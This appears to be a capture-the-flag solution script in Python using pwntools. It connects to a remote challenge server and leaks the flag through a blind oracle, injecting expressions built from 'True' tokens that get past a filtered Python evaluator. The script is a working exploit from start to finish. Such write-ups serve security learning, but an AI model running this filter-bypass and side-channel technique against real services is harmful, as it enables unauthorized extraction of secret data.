# ========================= Setup =========================
from pwn import *
io = remote("34.34.58.232", 1337)
def read():
	(io.readuntil(b'input: '))

read()

# ========================= Find length of the flag =========================

flag_len=0
for i in range(5,100):
	io.sendline(f'ord(flag[{("True+"*i)[:-1]}])'.encode())
	x=io.readline().strip()
	if b'nice' in x:
		continue
	if b'error' in x:
		flag_len=i-1
		print(f'Found len! len={flag_len}')
		break

# ========================= Find the flag =========================
flag='ictf{' # for flag[0] we would have to use False instead of True but we already know the first character.
for i in range(5,flag_len):
	print(flag)
	for j in range(45,127):	
		payload=f'[{("True,"*j)[:-1]}][ord(flag[{("True+"*i)[:-1]}])]'
		io.sendline(payload.encode())
		x = io.readline().strip()
		if b'error' in x:
			continue
		if b'nice' in x:
			flag += chr(j-1)
			break

print(flag)
